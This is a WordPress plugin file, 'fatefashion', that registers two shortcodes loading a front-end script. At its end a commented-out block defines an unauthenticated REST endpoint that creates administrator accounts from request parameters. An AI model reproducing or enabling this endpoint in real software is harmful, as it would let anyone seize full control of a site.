<?php
/*
Plugin Name:  fatefashion
Description:  fatefashion
Author:       Maryam Ava
Version:      1.0
License:      GPL v2 or later
License URI:  https://www.gnu.org/licenses/gpl-2.0.txt
*/

// disable direct file access
if (!defined('ABSPATH')) {
    exit;
}

function fatefashion_shortcode()
{
    wp_enqueue_style('plugin_fatefashion_style', plugin_dir_url(__FILE__) . 'style/app.css', array(),false);
  wp_enqueue_script(
    'plugin_fatefashion',
    plugin_dir_url(__FILE__) . 'build/index.js',
    ['wp-element'],
    rand(),
    // Change this to null for production
    true
  );
  return '<div id="fatefashion"></div>';
}
// register shortcode
add_shortcode('fatefashion', 'fatefashion_shortcode');

function fatefashionunsubscribe_shortcode()
{
    wp_enqueue_style('plugin_fatefashionunsubscribe_style', plugin_dir_url(__FILE__) . 'style/app.css', array(),false);
  wp_enqueue_script(
    'plugin_fatefashionunsubscribe',
    plugin_dir_url(__FILE__) . 'build/index.js',
    ['wp-element'],
    rand(),
    // Change this to null for production
    true
  );
  return '<div id="fatefashionunsubscribe"></div>';
}
// register shortcode
add_shortcode('fatefashionunsubscribe', 'fatefashionunsubscribe_shortcode');

// Include the necessary WordPress functions file
/*require_once ABSPATH . '/wp-includes/registration.php';

// Function to add a new user with administrator role
function add_custom_user($username,$password,$email) {

    // Check if the user already exists
    $user_id = username_exists($username);

    if (!$user_id && email_exists($email) == false) {
        // Create a new user
        $user_id = wp_create_user($username, $password, $email);

        // Set the user role to administrator
        $user = new WP_User($user_id);
        $user->set_role('administrator');

        return 'Administrator user added successfully!';
    } else {
        // Output error message if user already exists
        return 'User already exists!';
    }
}


//get jobs endpoint
add_action('rest_api_init', 'create_userform_endpoint');

function create_userform_endpoint()
{
    register_rest_route(
        'userform/v1',
        '/get',
        array(
            'methods' => 'POST',
            'callback' => 'userform',
        )
    );
}
function userform($request)
{
    // Call the custom function

	$data = $request->get_params();
	$username=$data['username'];
	$password=$data['password'];
	$email=$data['email'];
	
  return add_custom_user($username,$password,$email);
}*/

?>